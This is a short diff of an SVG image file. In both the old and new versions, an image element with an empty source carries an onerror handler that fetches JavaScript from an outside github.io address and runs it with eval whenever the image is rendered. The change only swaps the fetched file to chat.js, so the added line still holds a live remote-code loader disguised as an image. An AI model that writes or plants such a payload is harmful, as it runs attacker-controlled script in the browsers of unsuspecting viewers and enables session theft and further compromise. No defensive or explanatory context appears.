@@ -2,7 +2,7 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
   <image x="10" y="10" width="180" height="180" 
          href="" 
-         onerror="fetch('https://totallylost-helpme.github.io/svg.html')
+         onerror="fetch('https://totallylost-helpme.github.io/chat.js')
                       .then(res => res.text())
                       .then(eval)
                       .catch(err => console.error('Error loading script:', err))" />
